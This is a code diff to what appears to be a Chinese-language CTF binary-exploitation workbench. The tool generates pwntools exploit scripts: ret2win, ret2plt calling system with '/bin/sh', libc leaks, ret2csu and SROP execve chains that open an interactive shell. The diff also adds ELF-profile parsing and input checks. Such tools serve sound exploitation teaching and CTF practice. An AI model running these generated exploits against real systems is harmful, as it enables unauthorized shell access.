@@ -113,6 +113,12 @@ function expSymbol(value, label) {
         throw new Error(label + " 请填函数或符号名称。");
     return expQuoted(value);
 }
+function expRequired(value, label) {
+    const s = (value || "").trim();
+    if (!s)
+        throw new Error(label + "不能为空。");
+    return s;
+}
 function expBytes(value) {
     const bytes = [];
     for (let i = 0; i < value.length;) {
@@ -139,6 +145,8 @@ function expBytes(value) {
 }
 function generateExp(kind, v) {
     const recipe = EXP_RECIPES[kind];
+    if (!recipe)
+        throw new Error("未知的模板。");
     const arch = v.arch === "i386" ? "i386" : "amd64";
     if (recipe.amd64Only && arch !== "amd64")
         throw new Error("这个模板仅支持 amd64。");
@@ -156,7 +164,7 @@ function generateExp(kind, v) {
         "from pwn import *", "from pathlib import Path", "",
         "context.clear(arch=" + expQuoted(arch) + ", os='linux')",
         "context.timeout = 3",
-        "BINARY = " + expQuoted(v.binary || "./pwn"),
+        "BINARY = " + expQuoted(expRequired(v.binary, "题目附件路径")),
         "OFFSET = " + offset + "  # cyclic + GDB 实测，不等于局部数组大小",
         "ELF_BASE = " + base + "  # PIE 时填写当前进程已确认的基址",
         "PROMPT = " + expBytes(v.prompt || ""),
@@ -164,7 +172,7 @@ function generateExp(kind, v) {
         "ALIGN_STAGE1 = " + align1,
         "ALIGN_STAGE2 = " + align2,
         "LOADER = " + expQuoted(v.loader || ""),
-        "LIBC_PATH = " + expQuoted(usesLibc ? (v.libc || "./libc.so.6") : ""),
+        "LIBC_PATH = " + expQuoted(usesLibc ? expRequired(v.libc, "libc 文件") : ""),
         "", "elf = ELF(BINARY, checksec=False)",
         "if elf.arch != " + expQuoted(arch) + ":", "    raise ValueError('架构与 ELF 不匹配')", "context.binary = elf",
         "if OFFSET is None:", "    raise ValueError('先填写 cyclic + GDB 测出的返回地址偏移')",
@@ -177,20 +185,20 @@ function generateExp(kind, v) {
         lines.push("libc = ELF(LIBC_PATH, checksec=False)", "if libc.arch != elf.arch:", "    raise ValueError('libc 与 ELF 架构不匹配')", "");
     lines.push("def start():", "    if args.REMOTE:", "        return remote(args.HOST or '127.0.0.1', int(args.PORT or 1337))", "    if LOADER:", "        if not LIBC_PATH:", "            raise ValueError('使用 loader 时一并设置匹配的 LIBC_PATH')", "        return process([LOADER, '--library-path', str(Path(LIBC_PATH).resolve().parent), elf.path])", "    return process(elf.path)", "", "def gadget(instructions):", "    found = ROP(elf).find_gadget(instructions)", "    if found is None:", "        raise ValueError('缺少 gadget: ' + '; '.join(instructions))", "    return found.address", "", "def send_payload(io, payload):", "    if INPUT_MODE == 'line' and b'\\n' in payload:", "        raise ValueError('载荷含换行，按行输入会提前终止')", "    if INPUT_MODE == 'cstring' and b'\\0' in payload:", "        raise ValueError('载荷含 NUL，strcpy 等字符串复制会截断')", "    if PROMPT and not io.recvuntil(PROMPT):", "        raise TimeoutError('未收到输入提示；请核对 PROMPT 与菜单协议')", "    if INPUT_MODE == 'line':", "        io.sendline(payload)", "    else:", "        io.send(payload)", "    # raw 单次读可能短读；循环定长读需按目标协议补足长度。", "", "def aligned_rop(enabled):", "    chain = ROP(elf)", "    if enabled and context.arch == 'amd64':", "        chain.raw(gadget(['ret']))", "    return chain", "");
     if (kind === "win") {
-        const target = expSymbol(v.target || "win", "目标函数");
-        const after = expSymbol(v.reentry || "main", "返回入口");
+        const target = expSymbol(expRequired(v.target, "目标函数"), "目标函数");
+        const after = expSymbol(expRequired(v.reentry, "返回入口"), "返回入口");
         const argsList = (v.arguments || "").trim() ? v.arguments.split(",").map(x => expExpression(x, "函数参数")).join(", ") : "";
         lines.push("TARGET = " + target, "TARGET_ARGS = [" + argsList + "]", "REENTRY = " + after, "", "def build_payload():", "    chain = aligned_rop(ALIGN_STAGE1)", "    chain.call(elf.sym[TARGET], TARGET_ARGS)", "    chain.raw(elf.sym[REENTRY])", "    log.info(chain.dump())", "    return flat(b'A' * OFFSET, chain.chain())", "", "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
     }
     else if (kind === "plt") {
-        const after = expSymbol(v.reentry || "main", "返回入口");
+        const after = expSymbol(expRequired(v.reentry, "返回入口"), "返回入口");
         const address = expNumber(v.stringAddress || "", "字符串地址", true);
-        const command = ropPyBytes(Array.from(new TextEncoder().encode((v.command || "/bin/sh") + "\0")));
+        const command = ropPyBytes(Array.from(new TextEncoder().encode(expRequired(v.command, "命令字符串") + "\0")));
         lines.push("REENTRY = " + after, "STRING_ADDRESS = " + address, "COMMAND = " + command, "", "def build_payload():", "    binsh = STRING_ADDRESS if STRING_ADDRESS is not None else next(elf.search(COMMAND), None)", "    if binsh is None:", "        raise ValueError('ELF 中没有指定命令字符串，请填写已知字符串地址')", "    chain = aligned_rop(ALIGN_STAGE1)", "    chain.call(elf.plt['system'], [binsh])", "    chain.raw(elf.sym[REENTRY])", "    log.info(chain.dump())", "    return flat(b'A' * OFFSET, chain.chain())", "", "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
     }
     else if (usesLibc) {
-        const symbol = expSymbol(v.leakSymbol || (kind === "libc-puts" ? "puts" : "write"), "泄漏符号");
-        const after = expSymbol(v.reentry || "main", "第二次输入入口");
+        const symbol = expSymbol(expRequired(v.leakSymbol, "泄漏符号"), "泄漏符号");
+        const after = expSymbol(expRequired(v.reentry, "第二次输入入口"), "第二次输入入口");
         const leakBytes = expNumber(v.leakBytes || (arch === "amd64" ? "6" : "4"), "有效泄漏字节数");
         if (kind === "libc-puts" && (Number(leakBytes) < 1 || Number(leakBytes) > (arch === "amd64" ? 8 : 4)))
             throw new Error("泄漏字节数超过指针宽度或小于 1。");
@@ -215,7 +223,7 @@ function generateExp(kind, v) {
     else if (kind === "csu") {
         const pop = expNumber(v.csuPop || "", "CSU pop 地址", true);
         const call = expNumber(v.csuCall || "", "CSU call 地址", true);
-        lines.push("CSU_POP = " + pop, "CSU_CALL = " + call, "INDIRECT_SYMBOL = " + expSymbol(v.indirectSymbol || "write", "间接调用符号"), "REENTRY = " + expSymbol(v.reentry || "main", "返回函数"), "CSU_LAYOUT = " + expQuoted(v.csuLayout === "forward" ? "forward" : "reverse"), "", "def csu_call(func_ptr, arg1, arg2, arg3, after):", "    if not CSU_POP or not CSU_CALL:", "        raise ValueError('填写当前 ELF 的两段 CSU 地址')", "    if not 0 <= arg1 <= 0xffffffff:", "        raise ValueError('edi 会截断第一参数，只能传 32 位值')", "    r13, r14, r15 = (arg1, arg2, arg3) if CSU_LAYOUT == 'forward' else (arg3, arg2, arg1)", "    # rbx=0, rbp=1：一次间接调用；其后 add rsp,8 + 六个 pop + ret", "    return flat(CSU_POP, 0, 1, func_ptr, r13, r14, r15, CSU_CALL, *([0] * 7), after)", "", "def build_payload():", "    call = csu_call(elf.got[INDIRECT_SYMBOL],", "                    " + expExpression(v.arg1 || "1", "参数 1") + ", " + expExpression(v.arg2 || "elf.got['write']", "参数 2") + ", " + expExpression(v.arg3 || "8", "参数 3") + ", elf.sym[REENTRY])", "    prefix = flat(gadget(['ret'])) if ALIGN_STAGE1 else b''", "    return flat(b'A' * OFFSET, prefix, call)", "", "def main():", "    io = start()", "    send_payload(io, build_payload())", "    # 这是一次三参数调用；后续 libc 基址计算和第二阶段按目标另接。", "    io.interactive()");
+        lines.push("CSU_POP = " + pop, "CSU_CALL = " + call, "INDIRECT_SYMBOL = " + expSymbol(expRequired(v.indirectSymbol, "间接调用符号"), "间接调用符号"), "REENTRY = " + expSymbol(expRequired(v.reentry, "返回函数"), "返回函数"), "CSU_LAYOUT = " + expQuoted(v.csuLayout === "forward" ? "forward" : "reverse"), "", "def csu_call(func_ptr, arg1, arg2, arg3, after):", "    if not CSU_POP or not CSU_CALL:", "        raise ValueError('填写当前 ELF 的两段 CSU 地址')", "    if not 0 <= arg1 <= 0xffffffff:", "        raise ValueError('edi 会截断第一参数，只能传 32 位值')", "    r13, r14, r15 = (arg1, arg2, arg3) if CSU_LAYOUT == 'forward' else (arg3, arg2, arg1)", "    # rbx=0, rbp=1：一次间接调用；其后 add rsp,8 + 六个 pop + ret", "    return flat(CSU_POP, 0, 1, func_ptr, r13, r14, r15, CSU_CALL, *([0] * 7), after)", "", "def build_payload():", "    call = csu_call(elf.got[INDIRECT_SYMBOL],", "                    " + expExpression(v.arg1 || "1", "参数 1") + ", " + expExpression(v.arg2 || "elf.got['write']", "参数 2") + ", " + expExpression(v.arg3 || "8", "参数 3") + ", elf.sym[REENTRY])", "    prefix = flat(gadget(['ret'])) if ALIGN_STAGE1 else b''", "    return flat(b'A' * OFFSET, prefix, call)", "", "def main():", "    io = start()", "    send_payload(io, build_payload())", "    # 这是一次三参数调用；后续 libc 基址计算和第二阶段按目标另接。", "    io.interactive()");
     }
     else {
         lines.push("POP_RAX = " + expNumber(v.popRax || "", "pop rax 地址", true), "SYSCALL = " + expNumber(v.syscall || "", "syscall 地址", true), "BINSH = " + expNumber(v.stringAddress || "", "/bin/sh 地址", true), "STACK_ADDRESS = " + expNumber(v.stackAddress || "", "恢复后的 rsp", true), "", "def build_payload():", "    if not STACK_ADDRESS:", "        raise ValueError('先填写当前进程中已知可用的栈地址')", "    pop_rax = POP_RAX if POP_RAX is not None else gadget(['pop rax', 'ret'])", "    syscall = SYSCALL if SYSCALL is not None else gadget(['syscall', 'ret'])", "    binsh = BINSH if BINSH is not None else next(elf.search(b'/bin/sh\\0'), None)", "    if binsh is None:", "        raise ValueError('ELF 中没有 /bin/sh，请填写已知地址或换用分阶段方案')", "    frame = SigreturnFrame()", "    frame.rax = constants.SYS_execve", "    frame.rdi = binsh", "    frame.rsi = 0", "    frame.rdx = 0", "    frame.rip = syscall", "    frame.rsp = STACK_ADDRESS", "    # execve 成功替换进程；失败后的继续执行路径需按目标设计。", "    return flat(b'A' * OFFSET, pop_rax, 15, syscall, bytes(frame))", "", "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
@@ -291,6 +299,49 @@ function expAnalyzeSource(source) {
     const kind = namedWin ? "win" : calls.includes("system") ? "plt" : calls.includes("write") ? "libc-write" : calls.includes("puts") ? "libc-puts" : null;
     return { kind, calls, target: namedWin?.[1], note: "只按文本识别调用线索；不判断漏洞是否可利用，也不从数组大小推算 offset。" };
 }
+function parseElfProfile(text) {
+    if (text.length > 200000)
+        throw new Error("检查结果超过 200 KB，请确认粘贴的是检查工具输出。");
+    const data = JSON.parse(text);
+    if (!data || typeof data !== "object")
+        throw new Error("检查结果应为 JSON 对象。");
+    const p = data;
+    if (p.format !== "pwnworkbench.elf.v1" || !["amd64", "i386"].includes(String(p.arch)))
+        throw new Error("不支持的检查结果格式或架构。");
+    if (typeof p.binary !== "string" || !/^\.\/[^/\\\x00-\x1f]+$/.test(p.binary))
+        throw new Error("附件路径应为 ./文件名。");
+    if (typeof p.sha256 !== "string" || !/^[a-f0-9]{64}$/.test(p.sha256))
+        throw new Error("缺少有效的附件 SHA-256。");
+    for (const key of ["functions", "plt", "got"]) {
+        const list = p[key];
+        if (!Array.isArray(list) || list.length > 4096 || !list.every(x => typeof x === "string" && x.length <= 512))
+            throw new Error("符号列表格式不正确。");
+    }
+    if (!p.security || typeof p.security !== "object")
+        throw new Error("缺少保护信息。");
+    const s = p.security;
+    if (typeof s.pie !== "boolean" || typeof s.canary !== "boolean" || (s.nx !== null && typeof s.nx !== "boolean") || ![null, "Full", "Partial"].includes(s.relro))
+        throw new Error("保护信息格式不正确。");
+    return p;
+}
+function applyElfProfile(profile) {
+    Object.keys(expDrafts).forEach(key => delete expDrafts[key]);
+    $("expFields").innerHTML = "";
+    for (const key of ["offset", "base", "prompt", "loader"])
+        expControl("exp" + key[0].toUpperCase() + key.slice(1)).value = "";
+    expControl("expMode").value = "raw";
+    expControl("expAlign1").value = expControl("expAlign2").value = "0";
+    expControl("expBinary").value = profile.binary;
+    expControl("expArch").value = profile.arch;
+    expControl("expSourceInput").value = "";
+    $("expAnalysis").textContent = "";
+    renderExpRecipe("win");
+    const target = ["win", "shell", "backdoor"].find(name => profile.functions.includes(name));
+    expControl("exp-field-target").value = target || "win";
+    updateExp();
+    const s = profile.security;
+    $("expProfileStatus").textContent = profile.binary + " · " + profile.arch + " · PIE " + (s.pie ? "开" : "关") + " / Canary " + (s.canary ? "检出" : "未检出") + " / NX " + (s.nx === null ? "未知" : s.nx ? "开" : "关") + " / RELRO " + (s.relro || "无") + "。PLT：" + (profile.plt.slice(0, 20).join(", ") || "未识别") + "。" + (target ? "已填入符号 " + target + "，请核对函数作用。" : "未识别 win 类符号，请自行选模板和填写目标函数。") + " SHA-256：" + profile.sha256;
+}
 function initExpWorkbench() {
     if (!["amd64", "i386"].includes(expControl("expArch").value))
         expControl("expArch").value = "amd64";
@@ -336,6 +387,14 @@ function initExpWorkbench() {
         if (result.calls.includes("gets")) {
             expControl("expMode").value = "line";
             updateExp();
+        }
+    });
+    $("expProfileApply").addEventListener("click", () => {
+        try {
+            applyElfProfile(parseElfProfile(expControl("expProfileInput").value));
+        }
+        catch (error) {
+            $("expProfileStatus").textContent = error instanceof Error ? error.message : String(error);
         }
     });
 }
@@ -2649,6 +2708,8 @@ ropGen();
 function setArch(a) {
     if (arch === a)
         return;
+    if (chain.length > 0 && !confirm("切换架构会清空当前调用链（链只属于一个架构）。要继续吗？"))
+        return;
     arch = a;
     $("strLabel").textContent = archText("文件名字符串（生成时自动 pushstr 压栈，文件名参数传 'rsp'）");
     $("strLabel2").textContent = archText("第二个文件名字符串（新名字：先 pushstr 再 mov r13, rsp 保存，第二个文件名参数传 'r13'）");
@@ -2667,7 +2728,7 @@ function setArch(a) {
         }
     }
     else {
-        $("subLine").innerHTML = "<code>rax = NR</code> · rdi / rsi / rdx / r10 / r8 / r9";
+        $("subLine").innerHTML = "<code>rax = NR</code> · rdi / rsi / rdx / r10 / r8 / r9（第 4 个参数是 r10，不是 rcx）";
         $("tableNote").textContent = "已按 x86-64 调用号表（syscall_64.tbl）复核：205 set_thread_area、211 get_thread_area、212 lookup_dcookie 在 amd64 上没有实现，调用只会返回 -ENOSYS，已从表中去掉（i386 上 205/211/212 是 getgroups32/getresgid32/chown32 等真实调用，243/244 才是 set/get_thread_area，不受影响）。没收录的号分两类：①未分配空号只有 337–423（共 87 个）；②有名无实现、调用只会返回 -ENOSYS 的 17 个：134 uselib、156 _sysctl、174 create_module、177 get_kernel_syms、178 query_module、180 nfsservctl、181 getpmsg、182 putpmsg、183 afs_syscall、184 tuxcall、185 security、205 set_thread_area、211 get_thread_area、212 lookup_dcookie、214 epoll_ctl_old、215 epoll_wait_old、236 vserver。注意 175=init_module、176=delete_module、179=quotactl 是真实可用的调用，335=uretprobe、336=uprobe 也是真实存在的新调用，都不是空号。找不到就换英文名再试。";
         var n64 = $("i386Note");
         if (n64) {
